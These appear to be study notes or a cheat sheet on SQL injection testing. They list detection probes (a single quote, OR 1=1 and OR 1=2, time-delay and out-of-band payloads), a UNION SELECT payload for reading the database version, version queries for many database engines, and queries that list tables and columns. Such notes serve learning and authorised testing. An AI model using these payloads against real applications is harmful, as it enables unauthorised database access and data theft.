Try:

The single quote character ' and look for errors or other anomalies.

Boolean conditions such as OR 1=1 and OR 1=2, and look for differences in the application's responses.

Payloads designed to trigger time delays when executed within a SQL query, and look for differences in the time taken to respond.

OAST payloads designed to trigger an out-of-band network interaction when executed within a SQL query, and monitor any resulting interactions.


## Versions

Example:
`' UNION SELECT @@version--`

Oracle: select * from v$VERSION;
DB2: select service_level from sysibmadm.env_inst_info;
PostgreSQL: select version();
Microsoft, MySQL: select @@version;
	MySQL: select version();
MariaDB: select version();
H2: SELECT H2VERSION() FROM DUAL
SQLite: select sqlite_version();
Firebird: select rdb$get_context('SYSTEM', 'ENGINE_VERSION') as version from rdb$database;


- <https://stackoverflow.com/questions/9646353/how-to-find-database-file-version>



## Listing the contents of the database
Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.

`SELECT * FROM information_schema.tables`



Oracle:
	- `SELECT * FROM all_tables`
	- `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`







